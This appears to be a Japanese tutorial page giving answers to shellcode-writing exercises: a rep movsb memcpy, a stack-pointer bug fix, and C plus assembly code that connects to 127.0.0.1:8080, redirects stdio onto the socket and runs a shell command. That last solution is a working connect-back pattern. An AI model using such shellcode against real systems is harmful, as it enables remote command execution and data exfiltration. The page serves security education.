@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="ptr-yudai">
+
+
+
+
+
+
+
+<title>例題の解答 - シェルコードの書き方 | PAWNYABLE!</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/frame.js"></script>
+    
+
+
+
+
+
+
+
+  <style type="text/css">
+.spoiler {
+  display: inline-flex;
+}
+p.spoiler {
+  display: flex;
+}
+.spoiler a {
+  pointer-events: none;
+}
+.spoiler-blur, .spoiler-blur > * {
+  transition: text-shadow .5s ease;
+}
+.spoiler .spoiler-blur, .spoiler .spoiler-blur > * {
+  color: rgba(0, 0, 0, 0);
+  background-color: rgba(0, 0, 0, 0);
+  text-shadow: 0 0 10px grey;
+  cursor: pointer;
+}
+.spoiler .spoiler-blur:hover, .spoiler .spoiler-blur:hover > * {
+  text-shadow: 0 0 5px grey;
+}
+.spoiler-box, .spoiler-box > * {
+  transition: color .5s ease,
+  background-color .5s ease;
+}
+.spoiler .spoiler-box, .spoiler .spoiler-box > * {
+  color: black;
+  background-color: black;
+  text-shadow: none;
+}</style><meta name="generator" content="Hexo 5.4.0"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      <div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/">PAWNYABLE</a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/practice/">Practice</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/about/">About</a>
+              </li> 
+                   
+          
+        </ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    <div class="post-head">
+    <div class="post-info">
+        <div class="post-title">
+            
+            
+                例題の解答 - シェルコードの書き方
+            
+            
+        </div>
+    </div>
+    <div class="h-line-primary"></div>
+    
+</div>
+
+    <div class="post-content">
+    <h2><span id="例題1">例題１</span></h2>
+<p>【問題】<br>
+<code>rep movsb</code>命令を使ってmemcpy相当のシェルコードを書いてください。</p>
+<p>【解答】<br>
+<code>rep</code>プレフィックスは後続の命令をrcxが0になるまでrcxをデクリメントしながら実行します。今回は<code>movsb</code>(1バイトずつコピー)なので、コピーするデータの長さをそのままrcxに入れましょう。<br>
+次に<code>movs</code>命令はrsiが指す先のデータをrdiが指す先にコピーします。命令が実行されるとrsi,rdiの値が更新されますが、デクリメントされるかインクリメントされるかはディレクションフラグに依存します。インクリメントさせたい場合はディレクションフラグを0にするため<code>cld</code>命令を呼びます。デクリメントさせたい場合は<code>std</code>命令を呼びます。今回は<code>movs</code>命令が呼ばれる度にポインタをインクリメントしたいので、<code>cld</code>を使います。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; memcpy(rdi, rsi, rdx);</span><br><span class="line">cld</span><br><span class="line">mov rcx, rdx</span><br><span class="line">rep movsb</span><br></pre></td></tr></table></figure>
+<h2><span id="例題2">例題２</span></h2>
+<p>【問題】<br>
+シェルコード領域は書き込み可能だがRSPの初期値が0から始まる状況で、次のようなシェルコードを書いたところ、Segmentation Faultを起こしてしまいました。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">  xor esp, esp    ; 初期状態RSP=0</span><br><span class="line">  lea rsp, [rel stack]</span><br><span class="line">  xor edx, edx</span><br><span class="line">  push rdx</span><br><span class="line">  lea rdi, [rel s_arg2]</span><br><span class="line">  push rdi</span><br><span class="line">  lea rdi, [rel s_arg1]</span><br><span class="line">  push rdi</span><br><span class="line">  lea rdi, [rel s_arg0]</span><br><span class="line">  push rdi</span><br><span class="line">  mov rsi, rsp</span><br><span class="line">  mov eax, 59</span><br><span class="line">  syscall</span><br><span class="line">  int3</span><br><span class="line">stack: times 1024 dq 0</span><br><span class="line">s_arg0: db &quot;/bin/sh&quot;, 0</span><br><span class="line">s_arg1: db &quot;-c&quot;, 0</span><br><span class="line">s_arg2: db &quot;/bin/ls -lha&quot;, 0</span><br></pre></td></tr></table></figure>
+<p>原因を特定して直してください。（ヒント：textセクションを書き込み可能にするにはldに<code>--omagic</code>オプションを渡す。）</p>
+<p>【解答】<br>
+このシェルコードではスタックを利用するためにスタックポインタをシェルコード領域に設定しています。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lea rsp, [rel stack]</span><br></pre></td></tr></table></figure>
+<p>スタックは低位アドレスに向かって利用されますが、ラベル<code>stack</code>は用意されたスタック領域の先頭を指しています。したがって、以降<code>push</code>命令が呼ばれると機械語領域を破壊してしまいます。<br>
+5行目を次のように変更すればスタックポインタの位置は正しくなります。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lea rsp, [rel stack + 1024]</span><br></pre></td></tr></table></figure>
+<p>なお、ユーザーランドの場合はこれで問題ないですが、もしカーネル空間でこのような処理をする場合、アラインメントに注意する必要があります。カーネルではスタックポインタが8の倍数でないと例外を引き起こしてしまうため、次のように<code>align</code>を利用しましょう。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">align 8</span><br><span class="line">stack: times 1024 dq 0</span><br></pre></td></tr></table></figure>
+<p>ファイルの全体は<a href="src/bug-fixed.S">ここ</a>からダウンロードできます。</p>
+<h2><span id="例題3">例題３</span></h2>
+<p>【問題】<br>
+「ls -lha」した結果を自分のサーバー（例：127.0.0.1:8080）に送信するシェルコードを書いてください。（ヒント：標準入出力をsocketのfdにdupするとpipeを作らなくてもexecveするだけで結果が転送される。）</p>
+<p>【解答】<br>
+特殊な構造体が出てくるような複雑なシェルコードを書くのが難しい時はC言語で書いてコンパイルしたものを参考にしましょう。今回のコードは次のようになります。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sa</span>;</span></span><br><span class="line">  <span class="keyword">int</span> sock;</span><br><span class="line"></span><br><span class="line">  sa.sin_family = AF_INET;</span><br><span class="line">  sa.sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">  sa.sin_port = htons(<span class="number">8080</span>);</span><br><span class="line">  sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">  connect(sock, (struct sockaddr*)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">  dup2(sock, <span class="number">0</span>);</span><br><span class="line">  dup2(sock, <span class="number">1</span>);</span><br><span class="line">  dup2(sock, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> *args[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;/bin/ls -lha&quot;</span>, <span class="number">0</span>&#125;;</span><br><span class="line">  execve(args[<span class="number">0</span>], args, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>inet_addr</code>等の変換結果はgdbで確認すれば分かります。（といっても<code>inet_addr</code>はIPアドレスを4バイトの値に変換し、<code>htons</code>はポート番号のエンディアンを変換するだけです。）<br>
+解答例は以下のようになります。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">  ; socket(AF_INET, SOCK_STREAM, 0)</span><br><span class="line">  xor edx, edx</span><br><span class="line">  mov esi, 1</span><br><span class="line">  mov edi, 2</span><br><span class="line">  mov eax, 41</span><br><span class="line">  syscall</span><br><span class="line">  mov r15d, eax</span><br><span class="line">  ; connect(sock, &amp;sa, sizeof(sa))</span><br><span class="line">  mov edx, 0x10</span><br><span class="line">  lea rsi, [rel sa]</span><br><span class="line">  mov edi, r15d</span><br><span class="line">  mov eax, 42</span><br><span class="line">  syscall</span><br><span class="line">  ; dup2(sock, 0)</span><br><span class="line">  xor esi, esi</span><br><span class="line">  mov edi, r15d</span><br><span class="line">  mov eax, 33</span><br><span class="line">  syscall</span><br><span class="line">  ; dup2(sock, 1)</span><br><span class="line">  mov esi, 1</span><br><span class="line">  mov edi, r15d</span><br><span class="line">  mov eax, 33</span><br><span class="line">  syscall</span><br><span class="line">  ; dup2(sock, 2)</span><br><span class="line">  mov esi, 2</span><br><span class="line">  mov edi, r15d</span><br><span class="line">  mov eax, 33</span><br><span class="line">  syscall</span><br><span class="line">  ; execve(args[0], args, NULL)</span><br><span class="line">  xor edx, edx</span><br><span class="line">  push rdx</span><br><span class="line">  lea rdi, [rel s_arg2]</span><br><span class="line">  push rdi</span><br><span class="line">  lea rdi, [rel s_arg1]</span><br><span class="line">  push rdi</span><br><span class="line">  lea rdi, [rel s_arg0]</span><br><span class="line">  push rdi</span><br><span class="line">  mov rsi, rsp</span><br><span class="line">  mov eax, 59</span><br><span class="line">  syscall</span><br><span class="line">  int3</span><br><span class="line"></span><br><span class="line">s_arg0:</span><br><span class="line">  db &quot;/bin/sh&quot;, 0</span><br><span class="line">s_arg1:</span><br><span class="line">  db &quot;-c&quot;, 0</span><br><span class="line">s_arg2:</span><br><span class="line">  db &quot;/bin/ls -lha&quot;, 0</span><br><span class="line"></span><br><span class="line">sa:</span><br><span class="line">  dw 2                          ; sin_family=AF_INET</span><br><span class="line">  dw 0x901f                     ; sin_port=8080</span><br><span class="line">  dd 0x0100007f                 ; sin_addr.s_addr=&lt;127.0.0.1&gt;</span><br><span class="line">  dq 0</span><br></pre></td></tr></table></figure>
+<p>ファイルの全体は<a href="src/revls.S">ここ</a>からダウンロードできます。</p>
+
+</div> 
+
+<div style="margin-top: 1em">
+    <div class="h-line-primary"></div>
+    
+</div>
+
+<script>
+    window.onload = detectors();
+</script>
+
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+                © 2022 ptr-yudai 🐈
+                <br>
+            
+            
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+  </body>
+</html>
